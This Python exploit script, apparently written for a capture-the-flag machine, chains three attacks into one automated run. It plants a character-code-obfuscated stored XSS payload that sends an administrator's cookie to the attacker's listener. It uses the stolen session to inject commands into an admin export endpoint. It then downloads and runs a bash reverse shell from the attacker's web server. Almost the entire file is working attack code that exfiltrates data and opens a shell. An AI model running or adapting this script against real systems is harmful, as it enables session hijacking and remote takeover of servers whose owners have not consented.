import requests, argparse, http.server, socketserver, threading, socket, re
from urllib.parse import quote_plus, unquote

parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', dest='target', help='Target Machine', required=True)
parser.add_argument('--ip', '-i', dest='ip', help='IP Attacker', required=True)
parser.add_argument('--port', '-po', dest='port', help='Port for listening', required=True)
args = parser.parse_args()

target = args.target
ip = args.ip
port = args.port
s = requests.Session()

http_proxy = {'http':'http://127.0.0.1:8080'}

def str2char():
    string = f"""document.write('<script src="http://{ip}/gotchu.js"></script>')"""
    char = [ord(char) for char in string]
    clear_char = ','.join(map(str,char))
    return clear_char

def generate_payload():
    # from 0xdf
    payload = f"""window.addEventListener('DOMContentLoaded', function() {{
    window.location = "http://{ip}:8000/?secret=" + encodeURI(document.getElementsByName("cookie")[0].value)
}});"""
    with open('gotchu.js', 'w') as f:
        f.write(payload)

    revshell = f"""#!/bin/bash
bash -i >& /dev/tcp/{ip}/{port} 0>&1
"""
    with open('rev', 'w') as f:
        f.write(revshell)

def login():
    url = f"http://{target}/login"
    data = "username=RickA&password=nevergonnagiveyouup"
    header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0','Content-Type':'application/x-www-form-urlencoded'}
    r = s.post(url, data, headers=header, proxies=http_proxy, allow_redirects=False)
    if '/agent' in r.text:
        print("[+] Success Login")
    else:
        print("[-] Something wrong, please check again")

def send_xss(payload):
    url = f"http://{target}/agent/addNote"
    data = f"uuid=a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8&body={quote_plus(payload)}"
    header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0','Content-Type':'application/x-www-form-urlencoded'}
    r = s.post(url, data, headers=header, proxies=http_proxy)
    if r.status_code == 200:
        print("[+] XSS successfully injected")
    else:
        print("[-] Huh, something wrong")

def start_http_server():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 80), Handler) as httpd:
        print("[i] Serving HTTP Server at port 80")
        httpd.serve_forever()

def setup_socket():
    print("[*] Setting up socket to receive cookie")
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((ip, 8000))
    sock.listen()

    print(f'[i] Listening on {ip} port 8000\n • Waiting to admin trigger XSS')
    (sock_c, ip_c) = sock.accept()
    get_request = sock_c.recv(4096)
    print('[+] Gotcha!')
    admin_cookie = re.search(b'secret=([^&\s]+)', get_request)
    admin_cookie = admin_cookie.group(1).decode('UTF-8')
    decode_admin = unquote(admin_cookie.split('=')[1])
    print('=> ' + decode_admin)
    return decode_admin

def command_injection(command, adm_cookie):
    url = f"http://{target}/admin/export?table=user%26{command}"
    cookie = {'connect.sid': adm_cookie}
    header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'}
    r = requests.get(url,cookies=cookie, headers=header, proxies=http_proxy, allow_redirects=False)
    if '/login' in r.text:
        print('[x] Unauthorized')

def ip2dec():
    octets = ip.split('.')
    dec = 0
    for i in range(4):
        dec += int(octets[i]) * (256 ** (3 - i))
    return dec

def main():
    print(f"[!] Make sure you already turn on nc listening to port {port}")
    thread_server = threading.Thread(target=start_http_server)
    charcode = str2char()
    xss_payload = f"""<img src="x/><script>eval(String.fromCharCode({charcode}))</script>">"""
    generate_payload()
    login()
    send_xss(xss_payload)
    thread_server.start()
    admin_session = setup_socket()
    ipdec = ip2dec()
    print('[i] Download Shell to victim machine')
    command_injection(f'wget {ipdec}/rev', admin_session)
    print('[i] Executing Shell, check your nc')
    command_injection('bash rev', admin_session)

if __name__ == "__main__":
    main()
    
